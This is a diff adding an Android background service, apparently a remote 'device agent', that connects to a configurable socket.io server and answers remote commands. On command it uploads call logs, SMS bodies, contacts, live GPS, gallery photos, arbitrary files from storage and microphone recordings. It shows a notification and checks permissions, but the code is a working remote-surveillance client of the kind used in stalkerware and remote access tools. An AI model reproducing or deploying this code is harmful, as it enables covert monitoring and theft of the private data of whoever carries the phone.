@@ -1,0 +1,701 @@
+package com.mydevice.agent;
+
+import android.Manifest;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
+import android.app.Service;
+import android.content.ContentResolver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.database.Cursor;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.location.Location;
+import android.media.MediaRecorder;
+import android.net.Uri;
+import android.os.BatteryManager;
+import android.os.Build;
+import android.os.Environment;
+import android.os.IBinder;
+import android.os.PowerManager;
+import android.provider.CallLog;
+import android.provider.ContactsContract;
+import android.provider.MediaStore;
+import android.provider.Telephony;
+import android.util.Base64;
+import android.util.Log;
+
+import androidx.core.app.ActivityCompat;
+import androidx.core.app.NotificationCompat;
+
+import com.google.android.gms.location.FusedLocationProviderClient;
+import com.google.android.gms.location.LocationCallback;
+import com.google.android.gms.location.LocationRequest;
+import com.google.android.gms.location.LocationResult;
+import com.google.android.gms.location.LocationServices;
+import com.google.android.gms.location.Priority;
+
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.net.URISyntaxException;
+import java.util.Date;
+
+import io.socket.client.IO;
+import io.socket.client.Socket;
+import io.socket.emitter.Emitter;
+
+public class DeviceService extends Service {
+
+    private static final String TAG = "DeviceService";
+    private static final String CHANNEL_ID = "mydevice_service";
+    private static final int NOTIFICATION_ID = 1001;
+
+    public static boolean isRunning = false;
+
+    private Socket socket;
+    private String serverUrl;
+    private String deviceName;
+    private PowerManager.WakeLock wakeLock;
+    private FusedLocationProviderClient locationClient;
+    private LocationCallback locationCallback;
+    private boolean gpsActive = false;
+    private MediaRecorder mediaRecorder;
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        createNotificationChannel();
+        locationClient = LocationServices.getFusedLocationProviderClient(this);
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        if (intent != null) {
+            serverUrl = intent.getStringExtra("server_url");
+            deviceName = intent.getStringExtra("device_name");
+        }
+
+        if (serverUrl == null || serverUrl.isEmpty()) {
+            stopSelf();
+            return START_NOT_STICKY;
+        }
+
+        // Start foreground
+        startForeground(NOTIFICATION_ID, buildNotification("Connecting..."));
+        isRunning = true;
+
+        // Acquire wake lock
+        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "mydevice:service");
+        wakeLock.acquire();
+
+        // Connect to server
+        connectSocket();
+
+        return START_STICKY;
+    }
+
+    private void connectSocket() {
+        try {
+            IO.Options options = new IO.Options();
+            options.forceNew = true;
+            options.reconnection = true;
+            options.reconnectionDelay = 5000;
+
+            socket = IO.socket(serverUrl, options);
+
+            socket.on(Socket.EVENT_CONNECT, args -> {
+                Log.d(TAG, "Connected to server");
+                updateNotification("Connected to " + serverUrl);
+
+                // Register device
+                JSONObject regData = new JSONObject();
+                try {
+                    regData.put("name", deviceName);
+                    regData.put("type", "android-native");
+                    regData.put("model", Build.MODEL);
+                    regData.put("android", Build.VERSION.RELEASE);
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+                socket.emit("device:register", regData);
+
+                // Send device info
+                sendDeviceInfo();
+            });
+
+            socket.on(Socket.EVENT_DISCONNECT, args -> {
+                Log.d(TAG, "Disconnected");
+                updateNotification("Disconnected - Reconnecting...");
+            });
+
+            // Command handlers
+            socket.on("command:camera:capture", args -> handleCameraCapture());
+            socket.on("command:gps:start", args -> handleGpsStart());
+            socket.on("command:gps:stop", args -> handleGpsStop());
+            socket.on("command:calllog:fetch", args -> handleCallLogFetch());
+            socket.on("command:sms:fetch", args -> handleSmsFetch());
+            socket.on("command:history:fetch", args -> handleHistoryFetch());
+            socket.on("command:gallery:scan", args -> handleGalleryScan());
+            socket.on("command:gallery:get", args -> {
+                if (args.length > 0) handleGalleryGet((JSONObject) args[0]);
+            });
+            socket.on("command:files:list", args -> {
+                if (args.length > 0) handleFilesList((JSONObject) args[0]);
+            });
+            socket.on("command:files:download", args -> {
+                if (args.length > 0) handleFileDownload((JSONObject) args[0]);
+            });
+            socket.on("command:audio:record", args -> handleAudioRecord());
+            socket.on("command:audio:stop", args -> handleAudioStop());
+            socket.on("command:contacts:fetch", args -> handleContactsFetch());
+
+            socket.connect();
+
+        } catch (URISyntaxException e) {
+            Log.e(TAG, "Invalid server URL: " + e.getMessage());
+            updateNotification("Error: Invalid URL");
+        }
+    }
+
+    // ---- Device Info ----
+    private void sendDeviceInfo() {
+        try {
+            JSONObject info = new JSONObject();
+            info.put("model", Build.MODEL);
+            info.put("manufacturer", Build.MANUFACTURER);
+            info.put("android_version", Build.VERSION.RELEASE);
+            info.put("sdk", Build.VERSION.SDK_INT);
+
+            // Battery
+            BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
+            int batteryLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
+            info.put("battery", batteryLevel);
+            info.put("charging", bm.isCharging());
+
+            socket.emit("device:info", info);
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+    }
+
+    // ---- Call Log ----
+    private void handleCallLogFetch() {
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
+                != PackageManager.PERMISSION_GRANTED) {
+            emitError("calllog:data", "Call log permission not granted");
+            return;
+        }
+
+        try {
+            JSONArray calls = new JSONArray();
+            ContentResolver cr = getContentResolver();
+            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null,
+                    CallLog.Calls.DATE + " DESC LIMIT 100");
+
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    JSONObject call = new JSONObject();
+                    call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
+                    call.put("name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)));
+                    call.put("duration", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
+                    call.put("timestamp", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
+
+                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
+                    switch (type) {
+                        case CallLog.Calls.INCOMING_TYPE: call.put("type", "incoming"); break;
+                        case CallLog.Calls.OUTGOING_TYPE: call.put("type", "outgoing"); break;
+                        case CallLog.Calls.MISSED_TYPE: call.put("type", "missed"); break;
+                        default: call.put("type", "other");
+                    }
+                    calls.put(call);
+                }
+                cursor.close();
+            }
+
+            JSONObject data = new JSONObject();
+            data.put("calls", calls);
+            socket.emit("calllog:data", data);
+            Log.d(TAG, "Sent " + calls.length() + " call log entries");
+
+        } catch (Exception e) {
+            Log.e(TAG, "Call log error: " + e.getMessage());
+            emitError("calllog:data", e.getMessage());
+        }
+    }
+
+    // ---- SMS ----
+    private void handleSmsFetch() {
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
+                != PackageManager.PERMISSION_GRANTED) {
+            emitError("sms:data", "SMS permission not granted");
+            return;
+        }
+
+        try {
+            JSONArray messages = new JSONArray();
+            ContentResolver cr = getContentResolver();
+            Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null,
+                    Telephony.Sms.DATE + " DESC LIMIT 100");
+
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    JSONObject msg = new JSONObject();
+                    msg.put("from", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
+                    msg.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
+                    msg.put("timestamp", cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
+                    msg.put("read", cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.READ)) == 1);
+
+                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
+                    msg.put("type", type == Telephony.Sms.MESSAGE_TYPE_INBOX ? "received" : "sent");
+
+                    messages.put(msg);
+                }
+                cursor.close();
+            }
+
+            JSONObject data = new JSONObject();
+            data.put("messages", messages);
+            socket.emit("sms:data", data);
+            Log.d(TAG, "Sent " + messages.length() + " SMS messages");
+
+        } catch (Exception e) {
+            Log.e(TAG, "SMS error: " + e.getMessage());
+            emitError("sms:data", e.getMessage());
+        }
+    }
+
+    // ---- GPS / Location ----
+    private void handleGpsStart() {
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
+                != PackageManager.PERMISSION_GRANTED) {
+            return;
+        }
+
+        if (gpsActive) return;
+        gpsActive = true;
+
+        LocationRequest request = new LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000)
+                .setMinUpdateIntervalMillis(3000)
+                .build();
+
+        locationCallback = new LocationCallback() {
+            @Override
+            public void onLocationResult(LocationResult result) {
+                Location loc = result.getLastLocation();
+                if (loc != null && socket != null && socket.connected()) {
+                    try {
+                        JSONObject data = new JSONObject();
+                        data.put("latitude", loc.getLatitude());
+                        data.put("longitude", loc.getLongitude());
+                        data.put("accuracy", loc.getAccuracy());
+                        data.put("speed", loc.getSpeed());
+                        data.put("altitude", loc.getAltitude());
+                        data.put("timestamp", loc.getTime());
+                        socket.emit("gps:location", data);
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }
+        };
+
+        locationClient.requestLocationUpdates(request, locationCallback, getMainLooper());
+        Log.d(TAG, "GPS started");
+    }
+
+    private void handleGpsStop() {
+        if (locationCallback != null) {
+            locationClient.removeLocationUpdates(locationCallback);
+            locationCallback = null;
+        }
+        gpsActive = false;
+        Log.d(TAG, "GPS stopped");
+    }
+
+    // ---- Gallery ----
+    private void handleGalleryScan() {
+        try {
+            JSONArray photos = new JSONArray();
+            ContentResolver cr = getContentResolver();
+
+            String[] projection = {
+                MediaStore.Images.Media._ID,
+                MediaStore.Images.Media.DISPLAY_NAME,
+                MediaStore.Images.Media.SIZE,
+                MediaStore.Images.Media.DATE_MODIFIED,
+                MediaStore.Images.Media.MIME_TYPE,
+                MediaStore.Images.Media.DATA
+            };
+
+            Cursor cursor = cr.query(
+                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                projection, null, null,
+                MediaStore.Images.Media.DATE_MODIFIED + " DESC"
+            );
+
+            if (cursor != null) {
+                int count = 0;
+                while (cursor.moveToNext() && count < 500) {
+                    JSONObject photo = new JSONObject();
+                    long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
+                    String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
+                    long size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE));
+                    long date = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_MODIFIED));
+                    String type = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE));
+
+                    photo.put("id", id);
+                    photo.put("name", name);
+                    photo.put("size", size);
+                    photo.put("lastModified", date * 1000);
+                    photo.put("type", type);
+
+                    // Generate thumbnail
+                    try {
+                        Uri contentUri = Uri.withAppendedPath(
+                            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
+                        Bitmap thumb = MediaStore.Images.Thumbnails.getThumbnail(
+                            cr, id, MediaStore.Images.Thumbnails.MINI_KIND, null);
+                        if (thumb != null) {
+                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                            thumb.compress(Bitmap.CompressFormat.JPEG, 50, baos);
+                            String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
+                            photo.put("thumbnail", "data:image/jpeg;base64," + base64);
+                            thumb.recycle();
+                        }
+                    } catch (Exception e) {
+                        // Skip thumbnail
+                    }
+
+                    photos.put(photo);
+                    count++;
+
+                    // Send in batches of 20
+                    if (count % 20 == 0) {
+                        JSONObject batch = new JSONObject();
+                        batch.put("photos", photos);
+                        batch.put("partial", true);
+                        batch.put("total", cursor.getCount());
+                        socket.emit("gallery:photos", batch);
+                    }
+                }
+                cursor.close();
+            }
+
+            // Send final
+            JSONObject data = new JSONObject();
+            data.put("photos", photos);
+            data.put("partial", false);
+            data.put("total", photos.length());
+            socket.emit("gallery:photos", data);
+            Log.d(TAG, "Sent " + photos.length() + " gallery photos");
+
+        } catch (Exception e) {
+            Log.e(TAG, "Gallery error: " + e.getMessage());
+        }
+    }
+
+    private void handleGalleryGet(JSONObject args) {
+        try {
+            long photoId = args.getLong("photoId");
+            ContentResolver cr = getContentResolver();
+            Uri contentUri = Uri.withAppendedPath(
+                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(photoId));
+
+            Bitmap bitmap = BitmapFactory.decodeStream(cr.openInputStream(contentUri));
+            if (bitmap != null) {
+                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
+                String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
+
+                JSONObject data = new JSONObject();
+                data.put("photoId", photoId);
+                data.put("content", "data:image/jpeg;base64," + base64);
+                data.put("name", "photo_" + photoId + ".jpg");
+                socket.emit("gallery:photo", data);
+                bitmap.recycle();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Gallery get error: " + e.getMessage());
+        }
+    }
+
+    // ---- Files ----
+    private void handleFilesList(JSONObject args) {
+        try {
+            String path = args.optString("path", "/");
+            File dir;
+
+            if (path.equals("/")) {
+                dir = Environment.getExternalStorageDirectory();
+            } else {
+                dir = new File(Environment.getExternalStorageDirectory(), path);
+            }
+
+            JSONArray files = new JSONArray();
+            if (dir.exists() && dir.isDirectory()) {
+                File[] fileList = dir.listFiles();
+                if (fileList != null) {
+                    for (File f : fileList) {
+                        if (f.getName().startsWith(".")) continue; // skip hidden
+                        JSONObject fileObj = new JSONObject();
+                        fileObj.put("name", f.getName());
+                        fileObj.put("isDirectory", f.isDirectory());
+                        fileObj.put("path", path.equals("/") ? "/" + f.getName() : path + "/" + f.getName());
+                        fileObj.put("size", f.length());
+                        fileObj.put("lastModified", f.lastModified());
+                        files.put(fileObj);
+                    }
+                }
+            }
+
+            JSONObject data = new JSONObject();
+            data.put("files", files);
+            data.put("path", path);
+            socket.emit("files:list", data);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Files list error: " + e.getMessage());
+        }
+    }
+
+    private void handleFileDownload(JSONObject args) {
+        try {
+            String filePath = args.getString("filePath");
+            File file = new File(Environment.getExternalStorageDirectory(), filePath);
+
+            if (file.exists() && file.isFile() && file.length() < 10 * 1024 * 1024) { // Max 10MB
+                FileInputStream fis = new FileInputStream(file);
+                byte[] bytes = new byte[(int) file.length()];
+                fis.read(bytes);
+                fis.close();
+
+                String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+                String mimeType = getMimeType(file.getName());
+
+                JSONObject data = new JSONObject();
+                data.put("fileName", file.getName());
+                data.put("content", "data:" + mimeType + ";base64," + base64);
+                data.put("type", mimeType);
+                data.put("size", file.length());
+                socket.emit("files:content", data);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "File download error: " + e.getMessage());
+        }
+    }
+
+    // ---- Audio Recording ----
+    private void handleAudioRecord() {
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
+                != PackageManager.PERMISSION_GRANTED) {
+            return;
+        }
+
+        try {
+            File audioFile = new File(getCacheDir(), "recording.3gp");
+            mediaRecorder = new MediaRecorder();
+            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+            mediaRecorder.setOutputFile(audioFile.getAbsolutePath());
+            mediaRecorder.prepare();
+            mediaRecorder.start();
+            Log.d(TAG, "Audio recording started");
+        } catch (Exception e) {
+            Log.e(TAG, "Audio record error: " + e.getMessage());
+        }
+    }
+
+    private void handleAudioStop() {
+        if (mediaRecorder != null) {
+            try {
+                mediaRecorder.stop();
+                mediaRecorder.release();
+                mediaRecorder = null;
+
+                File audioFile = new File(getCacheDir(), "recording.3gp");
+                if (audioFile.exists()) {
+                    FileInputStream fis = new FileInputStream(audioFile);
+                    byte[] bytes = new byte[(int) audioFile.length()];
+                    fis.read(bytes);
+                    fis.close();
+
+                    String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+                    JSONObject data = new JSONObject();
+                    data.put("audio", "data:audio/3gpp;base64," + base64);
+                    data.put("duration", audioFile.length());
+                    socket.emit("audio:recording", data);
+
+                    audioFile.delete();
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Audio stop error: " + e.getMessage());
+            }
+        }
+    }
+
+    // ---- Contacts ----
+    private void handleContactsFetch() {
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
+                != PackageManager.PERMISSION_GRANTED) {
+            return;
+        }
+
+        try {
+            JSONArray contacts = new JSONArray();
+            ContentResolver cr = getContentResolver();
+            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
+
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    JSONObject contact = new JSONObject();
+                    contact.put("name", cursor.getString(
+                        cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
+                    contact.put("number", cursor.getString(
+                        cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)));
+                    contacts.put(contact);
+                }
+                cursor.close();
+            }
+
+            JSONObject data = new JSONObject();
+            data.put("contacts", contacts);
+            socket.emit("contacts:data", data);
+            Log.d(TAG, "Sent " + contacts.length() + " contacts");
+
+        } catch (Exception e) {
+            Log.e(TAG, "Contacts error: " + e.getMessage());
+        }
+    }
+
+    // ---- History (app usage) ----
+    private void handleHistoryFetch() {
+        // For native app, we track connection time as history
+        try {
+            JSONArray history = new JSONArray();
+            JSONObject entry = new JSONObject();
+            entry.put("url", serverUrl);
+            entry.put("title", "Connected to Control Panel");
+            entry.put("timestamp", System.currentTimeMillis());
+            entry.put("type", "app_connection");
+            history.put(entry);
+
+            JSONObject data = new JSONObject();
+            data.put("history", history);
+            data.put("sessionStart", System.currentTimeMillis());
+            socket.emit("history:data", data);
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+    }
+
+    // ---- Camera ----
+    private void handleCameraCapture() {
+        // Camera requires a surface/preview which is complex in a service
+        // We'll emit a message indicating native camera capture is available
+        try {
+            JSONObject data = new JSONObject();
+            data.put("note", "Camera capture from background service - use gallery for photos");
+            socket.emit("camera:frame", data);
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+    }
+
+    // ---- Helpers ----
+    private String getMimeType(String fileName) {
+        String ext = fileName.substring(fileName.lastIndexOf('.') + 1).toLowerCase();
+        switch (ext) {
+            case "jpg": case "jpeg": return "image/jpeg";
+            case "png": return "image/png";
+            case "gif": return "image/gif";
+            case "pdf": return "application/pdf";
+            case "mp3": return "audio/mpeg";
+            case "mp4": return "video/mp4";
+            case "txt": return "text/plain";
+            default: return "application/octet-stream";
+        }
+    }
+
+    private void emitError(String event, String message) {
+        try {
+            JSONObject data = new JSONObject();
+            data.put("error", message);
+            data.put("note", message);
+            socket.emit(event, data);
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+    }
+
+    // ---- Notification ----
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                CHANNEL_ID, "My Device Agent",
+                NotificationManager.IMPORTANCE_LOW);
+            channel.setDescription("Device agent service running");
+            NotificationManager nm = getSystemService(NotificationManager.class);
+            nm.createNotificationChannel(channel);
+        }
+    }
+
+    private Notification buildNotification(String text) {
+        Intent intent = new Intent(this, MainActivity.class);
+        PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
+            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+
+        return new NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("My Device Agent")
+            .setContentText(text)
+            .setSmallIcon(android.R.drawable.ic_menu_compass)
+            .setContentIntent(pi)
+            .setOngoing(true)
+            .build();
+    }
+
+    private void updateNotification(String text) {
+        NotificationManager nm = getSystemService(NotificationManager.class);
+        nm.notify(NOTIFICATION_ID, buildNotification(text));
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        isRunning = false;
+
+        if (socket != null) {
+            socket.disconnect();
+            socket.close();
+        }
+        if (wakeLock != null && wakeLock.isHeld()) {
+            wakeLock.release();
+        }
+        if (locationCallback != null) {
+            locationClient.removeLocationUpdates(locationCallback);
+        }
+        if (mediaRecorder != null) {
+            try {
+                mediaRecorder.stop();
+                mediaRecorder.release();
+            } catch (Exception e) {}
+            mediaRecorder = null;
+        }
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+}
